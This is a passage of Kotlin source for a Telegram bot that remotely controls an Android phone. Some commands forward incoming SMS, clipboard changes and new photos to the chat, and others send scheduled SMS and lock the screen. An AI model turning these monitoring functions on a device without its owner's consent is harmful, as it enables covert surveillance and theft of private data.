            "off", "0", "false", "disable" -> false
            "toggle" -> !currentOn
            else -> null
        }
        if (setOn != null) {
            nm.setInterruptionFilter(if (setOn) android.app.NotificationManager.INTERRUPTION_FILTER_NONE else android.app.NotificationManager.INTERRUPTION_FILTER_ALL)
        }
        val isOn = nm.currentInterruptionFilter == android.app.NotificationManager.INTERRUPTION_FILTER_NONE
        val state = if (isOn) "🔇 <b>ON</b> (all calls and notifications silenced)" else "🔔 <b>OFF</b> (notifications active)"
        val rows = listOf(listOf("🔇 DND On" to "dnd_on", "🔔 DND Off" to "dnd_off"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        sendMessage("🔇 <b>Do Not Disturb</b>\nStatus: $state", replyMarkup = markup)
    }

    // ==================== /screentime ====================

    private fun cmdScreenTime(args: List<String>) {
        sendTyping()
        val days = (args.firstOrNull()?.toIntOrNull() ?: 1).coerceIn(1, 7)
        try {
            val usm = MainApp.instance.getSystemService(android.content.Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val now = System.currentTimeMillis()
            val start = now - days.toLong() * 24 * 60 * 60 * 1000
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, now)
            if (stats.isNullOrEmpty()) {
                sendMessage("⏱ No usage data. Make sure PlainApp has <b>Usage Access</b> permission (Settings → Apps → Special app access → Usage access).")
                return
            }
            val merged = mutableMapOf<String, Long>()
            stats.forEach { s ->
                if (s.totalTimeInForeground > 0) {
                    merged[s.packageName] = (merged[s.packageName] ?: 0L) + s.totalTimeInForeground
                }
            }
            val sorted = merged.entries.sortedByDescending { it.value }.take(20)
            val sb = StringBuilder("⏱ <b>Screen Time</b> · last $days day(s)\n━━━━━━━━━━━━━━━━━━━━\n")
            sorted.forEachIndexed { i, (pkg, ms) ->
                val appLabel = try { MainApp.instance.packageManager.getApplicationLabel(MainApp.instance.packageManager.getApplicationInfo(pkg, 0)).toString() } catch (_: Exception) { pkg }
                val h = ms / 3600000; val m = (ms % 3600000) / 60000
                val timeStr = if (h > 0) "${h}h ${m}m" else "${m}m"
                sb.append("${i + 1}. <b>${htmlEsc(appLabel.take(28))}</b>  $timeStr\n")
            }
            sendMessage(sb.toString())
        } catch (e: Exception) {
            sendMessage("❌ Screen time error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /blocknumber ====================

    private suspend fun cmdBlockNumber(args: List<String>) {
        sendTyping()
        if (args.isNotEmpty()) {
            val num = args.joinToString(" ").trim()
            val existing = BlockedNumberHelper.getAll()
            val match = existing.firstOrNull { it.number == num || it.normalizedNumber == num }
            if (match != null) {
                BlockedNumberHelper.delete(match.number)
                sendMessage("✅ Unblocked: <code>${htmlEsc(num)}</code>")
            } else {
                BlockedNumberHelper.add(num)
                sendMessage("🚫 Blocked: <code>${htmlEsc(num)}</code>")
            }
            return
        }
        renderBlockNumberPage(editMessageId = null)
    }

    private suspend fun renderBlockNumberPage(editMessageId: Long?) {
        try {
            val blocked = BlockedNumberHelper.getAll()
            val sb = StringBuilder("🚫 <b>Blocked Numbers</b> (${blocked.size})\n")
            if (blocked.isEmpty()) {
                sb.append("\n<i>No blocked numbers.</i>\n\nUse /blocknumber &lt;number&gt; to block one.")
                val rows = listOf(listOf("➕ Block a number" to "bn_add"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
                else sendMessage(sb.toString(), replyMarkup = markup)
                return
            }
            sb.append("<i>Tap 🗑 to unblock immediately.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            blocked.take(20).forEachIndexed { i, b ->
                val name = lookupContactName(b.number)
                sb.append("${i + 1}. 🚫 <code>${htmlEsc(b.number)}</code>")
                if (name.isNotBlank()) sb.append("  <b>${htmlEsc(name)}</b>")
                sb.append("\n")
                val label = if (name.isNotBlank()) "${name.take(14)} (${b.number.takeLast(8)})" else b.number.take(24)
                rows.add(listOf("🗑 Unblock $label" to "bn_del:${phoneToken(b.number)}"))
            }
            if (blocked.size > 20) sb.append("\n<i>… and ${blocked.size - 20} more.</i>")
            rows.add(listOf("➕ Block a number" to "bn_add", "🔄 Refresh" to "bn_pg"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read blocked numbers: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /nowplaying ====================

    private suspend fun cmdNowPlaying() {
        sendTyping()
        renderNowPlaying(editMessageId = null)
    }

    private suspend fun renderNowPlaying(editMessageId: Long?) {
        try {
            // MediaController requires all property reads on the main thread
            val (isPlaying, pos) = withContext(kotlinx.coroutines.Dispatchers.Main) {
                AudioPlayer.isPlaying() to AudioPlayer.playerProgress
            }
            val ctx = MainApp.instance
            val playingPath = com.ismartcoding.plain.preferences.AudioPlayingPreference.getValueAsync(ctx)
            val sb = StringBuilder("🎵 <b>Now Playing</b>\n━━━━━━━━━━━━━━━━━━━━\n")
            if (playingPath.isBlank()) {
                sb.append("<i>Nothing is loaded yet.</i>\n\nUse /music to browse the library.")
                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("🎵 Music library" to "music_cmd")))
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
                else sendMessage(sb.toString(), replyMarkup = markup)
                return
            }
            val fileName = java.io.File(playingPath).nameWithoutExtension
            sb.append("🎵 <b>${htmlEsc(fileName)}</b>\n")
            val posStr = "${pos / 60000}:${((pos % 60000) / 1000).toString().padStart(2, '0')}"
            sb.append("⏱ Position: $posStr\n")
            sb.append("Status: ${if (isPlaying) "▶️ Playing" else "⏸ Paused"}\n")
            val playPause = if (isPlaying) "⏸ Pause" to "np_pause" else "▶️ Play" to "np_play"
            val rows = listOf(
                listOf("⏮ Prev" to "np_prev", playPause, "⏭ Next" to "np_next"),
                listOf("🔄 Refresh" to "np_refresh"),
            )
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Player error: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /forwardsms ====================

    private fun cmdForwardSms(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardSmsEnabled = setEnabled else forwardSmsEnabled = !forwardSmsEnabled
        coIO { TelegramBotForwardSmsPreference.putAsync(MainApp.instance, forwardSmsEnabled) }
        val state = if (forwardSmsEnabled) "✅ <b>ON</b> — incoming SMS will be forwarded to this chat" else "🔕 <b>OFF</b> — SMS forwarding is paused"
        val rows = listOf(listOf("✅ Enable" to "smsfwd_on", "🔕 Disable" to "smsfwd_off"))
        sendMessage("📩 <b>SMS Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    // ==================== /clipboard ====================

    @Volatile private var forwardClipboardEnabled: Boolean = false
    @Volatile private var lastClipboardText: String = ""
    private var clipboardMonitorJob: kotlinx.coroutines.Job? = null

    private suspend fun cmdClipboard(argText: String) {
        sendTyping()
        val ctx = MainApp.instance
        val cm = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
        if (argText.isNotBlank()) {
            try {
                val clip = android.content.ClipData.newPlainText("plain", argText)
                cm?.setPrimaryClip(clip)
                sendMessage("✅ Clipboard set to:\n<pre>${htmlEsc(argText.take(1000))}</pre>")
            } catch (e: Exception) {
                sendMessage("❌ Could not set clipboard: ${htmlEsc(e.message ?: "")}")
            }
            return
        }
        try {
            val item = cm?.primaryClip?.getItemAt(0)
            val text = item?.coerceToText(ctx)?.toString()
            if (text.isNullOrBlank()) {
                sendMessage("📋 <b>Clipboard</b>\n<i>Empty or inaccessible (Android 10+ restricts background clipboard reads).</i>")
            } else {
                sendMessage("📋 <b>Clipboard</b>\n<pre>${htmlEsc(text.take(2000))}</pre>${if (text.length > 2000) "\n<i>… truncated (${text.length} chars)</i>" else ""}")
            }
        } catch (e: Exception) {
            sendMessage("❌ Clipboard access error: ${htmlEsc(e.message ?: "")}\n<i>Android 10+ restricts background clipboard reads.</i>")
        }
    }

    private fun cmdForwardClipboard(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardClipboardEnabled = setEnabled else forwardClipboardEnabled = !forwardClipboardEnabled
        if (forwardClipboardEnabled) {
            startClipboardMonitor()
        } else {
            clipboardMonitorJob?.cancel()
            clipboardMonitorJob = null
        }
        val state = if (forwardClipboardEnabled) "✅ <b>ON</b> — clipboard changes will be forwarded here" else "🔕 <b>OFF</b> — monitoring paused"
        val rows = listOf(listOf("✅ Enable" to "clipfwd_on", "🔕 Disable" to "clipfwd_off"))
        sendMessage("📋 <b>Clipboard Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun startClipboardMonitor() {
        clipboardMonitorJob?.cancel()
        clipboardMonitorJob = scope.launch {
            while (forwardClipboardEnabled && isActive) {
                try {
                    val ctx = MainApp.instance
                    val cm = ctx.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                    val text = cm?.primaryClip?.getItemAt(0)?.coerceToText(ctx)?.toString() ?: ""
                    if (text.isNotBlank() && text != lastClipboardText) {
                        lastClipboardText = text
                        sendMessage("📋 <b>Clipboard changed:</b>\n<pre>${htmlEsc(text.take(1500))}</pre>")
                    }
                } catch (_: Throwable) {}
                kotlinx.coroutines.delay(30_000L)
            }
        }
    }

    // ==================== /mobiledata ====================

    private suspend fun cmdMobileData(args: List<String>) {
        sendTyping()
        val ctx = MainApp.instance
        val tm = ctx.getSystemService(android.content.Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
        val cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager

        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }

        if (setEnabled != null) {
            val ok = trySetMobileData(ctx, tm, setEnabled)
            if (ok) {
                sendMessage("✅ Mobile data turned ${if (setEnabled) "ON" else "OFF"}.")
            } else {
                sendMessage("❌ Could not toggle mobile data.\n<i>Requires MODIFY_PHONE_STATE permission or privileged system access.\nOn most Android 10+ devices this needs root or a system app.</i>")
            }
            return
        }

        val sb = StringBuilder("📡 <b>Mobile Data</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        try {
            val network = cm?.activeNetwork
            val nc = cm?.getNetworkCapabilities(network)
            val hasMobile = nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true
            sb.append("Status: ${if (hasMobile) "🟢 Active (cellular)" else "⚪ Not active via cellular"}\n")
            if (tm != null) {
                sb.append("Network operator: ${tm.networkOperatorName.ifBlank { "unknown" }}\n")
                sb.append("Data state: ${datStateStr(tm.dataState)}\n")
                sb.append("SIM state: ${simStateStr(tm.simState)}\n")
            }
        } catch (e: Exception) {
            sb.append("Status read error: ${htmlEsc(e.message ?: "")}\n")
        }
        val rows = listOf(
            listOf("📡 Turn ON" to "mdata_on", "📴 Turn OFF" to "mdata_off"),
        )
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun trySetMobileData(ctx: android.content.Context, tm: android.telephony.TelephonyManager?, enable: Boolean): Boolean {
        if (tm == null) return false
        return try {
            val m = tm.javaClass.getDeclaredMethod("setDataEnabled", Boolean::class.java)
            m.isAccessible = true
            m.invoke(tm, enable)
            true
        } catch (_: Throwable) {
            try {
                val m = tm.javaClass.getDeclaredMethod("setMobileDataEnabled", Boolean::class.java)
                m.isAccessible = true
                m.invoke(tm, enable)
                true
            } catch (_: Throwable) { false }
        }
    }

    private fun datStateStr(s: Int): String = when (s) {
        android.telephony.TelephonyManager.DATA_CONNECTED -> "connected"
        android.telephony.TelephonyManager.DATA_CONNECTING -> "connecting"
        android.telephony.TelephonyManager.DATA_DISCONNECTED -> "disconnected"
        android.telephony.TelephonyManager.DATA_SUSPENDED -> "suspended"
        else -> "unknown($s)"
    }

    private fun simStateStr(s: Int): String = when (s) {
        android.telephony.TelephonyManager.SIM_STATE_READY -> "ready"
        android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "absent"
        android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN required"
        android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK required"
        android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "network locked"
        else -> "other"
    }

    // ==================== /bluetooth ====================

    private suspend fun cmdBluetooth(args: List<String>) {
        sendTyping()
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) {
            val ok = BluetoothControlHelper.setEnabled(setEnabled)
            if (ok) {
                kotlinx.coroutines.delay(1200)
                renderBluetoothState(editMessageId = null)
            } else {
                sendMessage("❌ Could not toggle Bluetooth.\n<i>On Android 13+ direct enable/disable is deprecated and may require user action via Settings.</i>")
            }
            return
        }
        renderBluetoothState(editMessageId = null)
    }

    private suspend fun renderBluetoothState(editMessageId: Long?) {
        val st = BluetoothControlHelper.state()
        val sb = StringBuilder("🔵 <b>Bluetooth</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        if (!st.supported) {
            sb.append("<i>Bluetooth is not supported on this device.</i>")
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString())
            else sendMessage(sb.toString())
            return
        }
        sb.append("Status: ${if (st.enabled) "🟢 Enabled" else "🔴 Disabled"}\n")
        sb.append("Paired devices: ${st.pairedCount}\n")
        sb.append("Nearby (BLE): ${st.nearbyCount}\n\n")
        if (st.enabled && st.hasConnectPermission) {
            val paired = BluetoothControlHelper.pairedList()
            if (paired.isNotEmpty()) {
                sb.append("<b>Paired devices:</b>\n")
                paired.take(10).forEach { d ->
                    val nearStr = if (d.nearby) " 🔵" else ""
                    sb.append("• ${htmlEsc(d.name.ifBlank { "Unknown" })} <code>${d.address}</code>$nearStr · ${d.type}\n")
                }
                if (paired.size > 10) sb.append("  … and ${paired.size - 10} more\n")
            }
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (st.enabled) {
            rows.add(listOf("🔴 Turn OFF" to "blue_off", "🔄 Refresh" to "blue_refresh"))
        } else {
            rows.add(listOf("🟢 Turn ON" to "blue_on", "🔄 Refresh" to "blue_refresh"))
        }
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ==================== /lockscreen ====================

    private suspend fun cmdLockScreen() {
        sendTyping()
        val ctx = MainApp.instance
        if (!DeviceAdminGuard.isAdminActive(ctx)) {
            sendMessage("❌ <b>Device Admin not active</b>\n\nPlainApp needs to be granted Device Administrator privileges to lock the screen.\n\nGo to: <b>Settings → Security → Device admin apps → PlainApp → Activate</b>")
            return
        }
        try {
            val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            sendMessage("🔒 Locking screen…")
            dpm.lockNow()
        } catch (e: Exception) {
            sendMessage("❌ Could not lock screen: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /forwardphotos ====================

    @Volatile private var forwardPhotosEnabled: Boolean = false
    @Volatile private var lastPhotoTimestamp: Long = System.currentTimeMillis()
    private var photoMonitorJob: kotlinx.coroutines.Job? = null

    private fun cmdForwardPhotos(args: List<String>) {
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        if (setEnabled != null) forwardPhotosEnabled = setEnabled else forwardPhotosEnabled = !forwardPhotosEnabled
        if (forwardPhotosEnabled) {
            lastPhotoTimestamp = System.currentTimeMillis()
            startPhotoMonitor()
        } else {
            photoMonitorJob?.cancel()
            photoMonitorJob = null
        }
        val state = if (forwardPhotosEnabled) "✅ <b>ON</b> — new photos will be forwarded here" else "🔕 <b>OFF</b> — monitoring paused"
        val rows = listOf(listOf("✅ Enable" to "photofwd_on", "🔕 Disable" to "photofwd_off"))
        sendMessage("📷 <b>Photo Forwarding</b>\nStatus: $state", replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun startPhotoMonitor() {
        photoMonitorJob?.cancel()
        photoMonitorJob = scope.launch {
            while (forwardPhotosEnabled && isActive) {
                kotlinx.coroutines.delay(30_000L)
                try {
                    val ctx = MainApp.instance
                    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                    val proj = arrayOf(
                        android.provider.MediaStore.Images.Media._ID,
                        android.provider.MediaStore.Images.Media.DATA,
                        android.provider.MediaStore.Images.Media.DATE_ADDED,
                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    )
                    val since = lastPhotoTimestamp / 1000
                    ctx.contentResolver.query(
                        uri, proj,
                        "${android.provider.MediaStore.Images.Media.DATE_ADDED} > ?",
                        arrayOf(since.toString()),
                        "${android.provider.MediaStore.Images.Media.DATE_ADDED} ASC",
                    )?.use { cursor ->
                        while (cursor.moveToNext()) {
                            val path = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)) ?: continue
                            val added = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED))
                            val name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)) ?: "photo"
                            lastPhotoTimestamp = added * 1000 + 1
                            val file = java.io.File(path)
                            if (!file.exists() || file.length() == 0L) continue
                            try {
                                TelegramApiClient.sendPhoto(token, chatId, file, caption = "📷 New photo: ${htmlEsc(name)}")
                            } catch (_: Throwable) {}
                        }
                    }
                } catch (_: Throwable) {}
            }
        }
    }

    // ==================== /airplane ====================

    private suspend fun cmdAirplane(args: List<String>) {
        sendTyping()
        val ctx = MainApp.instance
        val setEnabled = when (args.firstOrNull()?.lowercase()) {
            "on", "1", "true", "enable" -> true
            "off", "0", "false", "disable" -> false
            else -> null
        }
        val current = android.provider.Settings.Global.getInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) != 0
        val sb = StringBuilder("✈️ <b>Airplane Mode</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: ${if (current) "🟢 ON" else "🔴 OFF"}\n\n")
        if (setEnabled != null) {
            val ok = trySetAirplaneMode(ctx, setEnabled)
            if (ok) {
                sendMessage("✅ Airplane mode turned ${if (setEnabled) "ON" else "OFF"}.\n<i>Note: some devices require root for this to take effect.</i>")
            } else {
                sendMessage("❌ Could not toggle airplane mode.\n<i>Requires WRITE_SECURE_SETTINGS or root access. This is a system-protected setting on Android 4.2+.</i>")
            }
            return
        }
        sb.append("<i>Toggling airplane mode requires WRITE_SECURE_SETTINGS or root on Android 4.2+.</i>")
        val rows = listOf(
            listOf("✈️ Turn ON" to "air_on", "🛬 Turn OFF" to "air_off"),
        )
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun trySetAirplaneMode(ctx: android.content.Context, enable: Boolean): Boolean {
        return try {
            android.provider.Settings.Global.putInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, if (enable) 1 else 0)
            val intent = android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED)
                .addFlags(android.content.Intent.FLAG_RECEIVER_REPLACE_PENDING)
                .putExtra("state", enable)
            ctx.sendBroadcast(intent)
            true
        } catch (_: Throwable) { false }
    }

    // ==================== /schedulesms ====================

    private suspend fun cmdScheduleSms(args: List<String>) {
        sendTyping()
        if (args.size < 3) {
            sendMessage("⏰ <b>Schedule SMS</b>\n\nUsage:\n<code>/schedulesms &lt;number&gt; &lt;delay_seconds&gt; &lt;message text&gt;</code>\n\nExample:\n<code>/schedulesms +15551234567 60 Hey, this was scheduled!</code>")
            return
        }
        val number = args[0]
        val delaySec = args[1].toLongOrNull()
        if (delaySec == null || delaySec < 1 || delaySec > 86400) {
            sendMessage("❌ Invalid delay. Use seconds between 1 and 86400 (24 hours).")
            return
        }
        val body = args.drop(2).joinToString(" ")
        sendMessage("⏰ SMS to <code>${htmlEsc(number)}</code> scheduled in <b>${delaySec}s</b>:\n<i>${htmlEsc(body.take(200))}</i>")
        scope.launch {
            kotlinx.coroutines.delay(delaySec * 1000L)
            try {
                SmsHelper.sendText(number, body)
                sendMessage("✅ Scheduled SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(body.take(200))}</i>")
            } catch (e: Exception) {
                sendMessage("❌ Scheduled SMS failed: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /batteryhistory ====================

    private suspend fun cmdBatteryHistory(args: List<String>) {
        sendTyping()
        val hours = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 720) ?: 24
        val days = ((hours + 23) / 24).coerceAtLeast(1)
        val win = BatteryHistoryHelper.window(days)
        val cutoff = System.currentTimeMillis() - hours * 3600_000L
        val samples = win.samples.filter { it.ts >= cutoff }
        val sb = StringBuilder("🔋 <b>Battery History — last ${hours}h</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("Current: ${win.currentLevel}% · ${if (win.charging) "⚡ Charging (${win.plugged})" else "🔋 Discharging"}\n\n")
        if (samples.isEmpty()) {
            sb.append("<i>No recorded samples yet. Battery sampling starts once the app's background service is active.</i>")
        } else {
            val barWidth = 20
            val buckets = 10
            val step = (samples.size.toFloat() / buckets).coerceAtLeast(1f)
            sb.append("<b>Level chart (${samples.size} samples):</b>\n<pre>")
            for (b in 0 until minOf(buckets, samples.size)) {
                val idx = (b * step).toInt().coerceAtMost(samples.size - 1)
                val s = samples[idx]
                val bars = ((s.level * barWidth) / 100).coerceIn(0, barWidth)
                val plugStr = if (s.plugged > 0) "⚡" else "  "
                sb.append("${fmtTime(s.ts).takeLast(5)} ${s.level.toString().padStart(3)}% $plugStr ${"█".repeat(bars)}${"░".repeat(barWidth - bars)}\n")
            }
            sb.append("</pre>")
            val first = samples.first()
            val last = samples.last()
            val diffLevel = last.level - first.level
            val diffHours = (last.ts - first.ts) / 3600_000.0
            if (diffHours > 0 && diffLevel < 0) {
                val drainPerHour = (-diffLevel / diffHours)
                val etaHours = if (drainPerHour > 0) last.level / drainPerHour else 0.0
                sb.append("\nDrain rate: <b>${String.format("%.1f", drainPerHour)}%/h</b>")
                if (!win.charging && etaHours > 0) {
                    sb.append(" · Est. empty in <b>${String.format("%.1f", etaHours)}h</b>")
                }
            }
        }
        sendMessage(sb.toString())
    }

    // ==================== /vpn ====================

    private suspend fun cmdVpn() {
        sendTyping()
        val ctx = MainApp.instance
        val cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
        val sb = StringBuilder("🔐 <b>VPN Status</b>\n━━━━━━━━━━━━━━━━━━━━\n")
        if (cm == null) {
            sb.append("<i>ConnectivityManager unavailable.</i>")
            sendMessage(sb.toString()); return
        }
        try {
            var vpnActive = false
            var vpnNetwork: android.net.Network? = null
            val networks = cm.allNetworks
            for (net in networks) {
                val nc = cm.getNetworkCapabilities(net) ?: continue
                if (nc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN)) {
                    vpnActive = true
                    vpnNetwork = net
                    break
                }
            }
            if (vpnActive) {
                val li = vpnNetwork?.let { cm.getLinkProperties(it) }
                sb.append("Status: 🟢 <b>VPN Connected</b>\n")
                val iface = li?.interfaceName
                if (iface != null) sb.append("Interface: <code>$iface</code>\n")
                val addrs = li?.linkAddresses?.joinToString(", ") { it.address.hostAddress ?: "" }
                if (!addrs.isNullOrBlank()) sb.append("VPN IP: <code>$addrs</code>\n")
                val dns = li?.dnsServers?.joinToString(", ") { it.hostAddress ?: "" }
                if (!dns.isNullOrBlank()) sb.append("DNS: <code>$dns</code>\n")
            } else {
                sb.append("Status: 🔴 <b>No VPN active</b>\n\n<i>No VPN transport detected on any network interface.</i>")
            }
            val activeNet = cm.activeNetwork
            val activeNc = cm.getNetworkCapabilities(activeNet)
            if (activeNc != null) {
                sb.append("\n<b>Active network:</b>\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) sb.append("• Wi-Fi\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) sb.append("• Cellular\n")
                if (activeNc.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) sb.append("• Ethernet\n")
            }
        } catch (e: Exception) {
            sb.append("Error reading VPN status: ${htmlEsc(e.message ?: "")}")
        }
        sendMessage(sb.toString())
    }

    // ==================== /clearcache ====================

    private suspend fun cmdClearCache(args: List<String>) {
        sendTyping()
        val q = args.joinToString(" ").trim()
        renderClearCachePage(q, 0, editMessageId = null)
    }

    private suspend fun renderClearCachePage(query: String, offset: Int, editMessageId: Long?) {
        val ctx = MainApp.instance
        val pm = ctx.packageManager
        val all = try {
            pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
        } catch (_: Throwable) { emptyList() }
        val filtered = if (query.isBlank()) {
            all.filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
        } else {
            val q = query.lowercase()
            all.filter { pm.getApplicationLabel(it).toString().lowercase().contains(q) || it.packageName.lowercase().contains(q) }
        }
        val pageSize = 8
        val total = filtered.size
        val page = filtered.drop(offset).take(pageSize)
        if (page.isEmpty()) {
            val msg = if (offset == 0) "🗑 No apps found${if (query.isNotBlank()) " matching \"${htmlEsc(query)}\"" else ""}." else "🗑 No more apps."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val sb = StringBuilder("🗑 <b>Clear App Cache</b> · ${offset + 1}–${offset + page.size} of $total\n<i>Tap an app to clear its cache.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        page.forEachIndexed { i, ai ->
            val label = pm.getApplicationLabel(ai).toString()
            val cacheDir = java.io.File(ai.dataDir, "cache")
            val cacheSize = if (cacheDir.exists()) dirSize(cacheDir) else 0L
            val sizeStr = if (cacheSize > 0) " (${formatBytes(cacheSize)})" else ""
            sb.append("${offset + i + 1}. <b>${htmlEsc(label.take(40))}</b>$sizeStr\n")
            val tok = pkgToken(ai.packageName)
            rows.add(listOf("🗑 Clear: ${label.take(22)}" to "cc_pick:$tok"))
        }
        val qSeg = safeSeg(query.ifBlank { "_" })
        val nav = mutableListOf<Pair<String, String>>()
        if (offset > 0) nav.add("◀️ Prev" to "cc_pg:$qSeg:${(offset - pageSize).coerceAtLeast(0)}")
        if (offset + pageSize < total) nav.add("Next ▶️" to "cc_pg:$qSeg:${offset + pageSize}")
        if (nav.isNotEmpty()) rows.add(nav)
        rows.add(listOf("🔍 Search" to "cc_q"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private fun clearAppCache(packageName: String): Boolean {
        val ctx = MainApp.instance
        return try {
            val ai = ctx.packageManager.getApplicationInfo(packageName, 0)
            val cacheDir = java.io.File(ai.dataDir, "cache")
            if (cacheDir.exists()) {
                cacheDir.deleteRecursively()
                true
            } else {
                // Also try externalCacheDir path heuristic
                val extCache = java.io.File(android.os.Environment.getExternalStorageDirectory(), "Android/data/$packageName/cache")
                if (extCache.exists()) { extCache.deleteRecursively(); true } else false
            }
        } catch (_: Throwable) { false }
    }

    private fun dirSize(dir: java.io.File): Long {
        var size = 0L
        dir.walkTopDown().forEach { f -> if (f.isFile) size += f.length() }
        return size
    }

    private fun formatBytes(bytes: Long): String = when {
        bytes < 1024L -> "${bytes}B"
        bytes < 1024L * 1024L -> "${bytes / 1024}KB"
        bytes < 1024L * 1024L * 1024L -> "${bytes / (1024 * 1024)}MB"
        else -> String.format("%.1fGB", bytes / (1024.0 * 1024.0 * 1024.0))
    }

    // ==================== /geofence ====================

    private suspend fun cmdGeofence(args: List<String>) {
        sendTyping()
        when (args.firstOrNull()?.lowercase()) {
            "events" -> renderGeofenceEvents(editMessageId = null)
            "add" -> {
                pendingInput = "gf_new"
                sendMessage("🗺 <b>Add geofence</b>\n\nSend in format:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>\n\nSend any /command to cancel.")
            }
            else -> renderGeofenceList(editMessageId = null)
        }
    }

    private suspend fun renderGeofenceList(editMessageId: Long?) {
        val fences = GeofencingHelper.listFences()
        val sb = StringBuilder("🗺 <b>Geofences</b> (${fences.size})\n━━━━━━━━━━━━━━━━━━━━\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
